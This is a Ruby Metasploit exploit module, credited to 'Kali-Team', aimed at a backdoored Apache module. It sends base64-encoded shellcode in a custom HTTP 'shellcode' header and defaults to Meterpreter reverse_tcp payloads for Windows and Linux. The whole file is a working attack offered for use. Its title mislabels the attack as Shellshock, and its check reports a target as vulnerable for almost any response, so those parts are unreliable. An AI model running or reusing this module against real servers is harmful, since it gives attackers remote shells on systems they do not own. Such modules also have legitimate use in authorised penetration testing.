##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache mod backdoor ShellCode Injection (Shellshock)',
        'Description' => %q{
          This module exploits the apache mod backdoor shellcode injection.
        },
        'Author' => [
          'Kali-Team',
        ],
        'References' => [
        ],
        'Targets' =>
          [
            [
              'Windows', {
                'Arch' => [ARCH_X86, ARCH_X64],
                'Platform' => 'win',
                'DefaultOptions' => {
                  'PAYLOAD' => 'windows/meterpreter/reverse_tcp'
                }
              }
            ],
            [
              'Linux', {
                'Arch' => [ARCH_X86, ARCH_X64],
                'Platform' => 'linux',
                'DefaultOptions' => {
                  'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
                }
              }
            ],

          ],
        'Privileged' => false,
        'CmdStagerFlavor' => 'c',
        'DisclosureDate' => '2020-08-31',
        'DefaultTarget' => 0
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Path to CGI script']),
      # OptString.new('METHOD', [true, 'HTTP method to use', 'GET']),
      # OptString.new('HEADER', [true, 'HTTP header to use', 'User-Agent']),
      # OptInt.new('TIMEOUT', [true, 'HTTP read response timeout (seconds)', 5]),
    ])
  end

  def check
    uri = target_uri.path
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, '/'),
      'headers' => {
        'Accept-Encoding' => 'gzip,deflate'
      }
    })

    if res && res.code != 500
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    unless session_created?
      uri = target_uri.path
      print_status(uri)
      print_good('Sending shellcode')
      send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(uri, '/'),
        'headers' => {
          'Accept-Encoding' => 'gzip,deflate',
          'shellcode' => Rex::Text.encode_base64(payload.raw)
        }
      })
    end
  end
end
